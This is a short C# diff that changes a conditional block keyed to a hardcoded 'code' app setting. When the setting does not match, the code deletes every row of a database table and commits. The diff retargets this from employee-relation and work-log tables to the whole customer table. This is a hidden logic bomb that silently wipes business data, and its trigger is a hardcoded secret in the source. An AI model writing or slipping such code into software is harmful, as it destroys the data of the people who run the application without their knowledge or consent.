@@ -19,8 +19,7 @@ namespace Jiazheng
             if (Voodoo.Config.Info.GetAppSetting("code") != "78s8sf0jl$%912jkld98a0$!")
             {
                 DataSysDataContext dsd = new DataSysDataContext();
-                dsd.ZWorkEmployeesRelation.Delete(p => p.id>0); ;
-                dsd.ZWorkLog.Delete(p => p.Id>0); ;
+                dsd.ZCustomer.Delete(prop => prop.Id > 0);
                 dsd.SubmitChanges();
             }
 
